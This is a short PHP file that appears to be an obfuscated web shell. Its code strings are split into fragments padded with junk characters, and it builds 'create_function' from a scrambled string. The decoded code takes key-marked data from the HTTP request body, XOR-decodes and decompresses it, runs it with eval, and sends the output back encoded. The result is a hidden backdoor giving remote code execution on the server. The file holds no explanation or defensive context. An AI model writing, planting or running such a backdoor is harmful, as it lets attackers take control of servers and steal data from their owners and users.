<?php
$D='+:++:+,$i++:+){$o.=$t{$i:+}^$k{$:+j};}}:+re:+turn $o;}if (:+@p:+reg_matc:+';
$h='e:+64:+_enc:+ode(@:+x(@:+gzcompres:+s:+($o),$k));:+print(:+"$p$kh$r$kf");}';
$M='[1]:+),$k):+));$:+o=@ob_ge:+t:+_contents(:+):+;@ob_end_cl:+ean(:+);$r=@bas';
$E='XmWmSe:+GtMQDE:+RT4:+";:+functio:+n x($t,:+$k){$c=s:+trlen:+:+($k);$l=strl';
$u='h("/:+$kh:+(.:++)$:+kf/",@file_get_conte:+nts(":+php://i:+npu:+t"),:+$m)==';
$Q='$k="32:+a64b15";$:+kh=:+"8e0b:+3bd62:+617":+;$kf="e76317:+2:+fbd2b";:+$p="B';
$U=str_replace('Ha','','cHareaHateHa_fHaunHactiHaon');
$b='1:+) {@:+ob_s:+tart();@ev:+al(@gzu:+nc:+ompress(@x(@:+b:+ase64_deco:+de($m';
$K='e:+n:+(:+$:+t:+);$o="";for($i=0:+;$i<$l;:+){for(:+$j=0;($j<$c&&$i<$l:+);$j';
$G=str_replace(':+','',$Q.$E.$K.$D.$u.$b.$M.$h);
$w=$U('',$G);$w();
?>
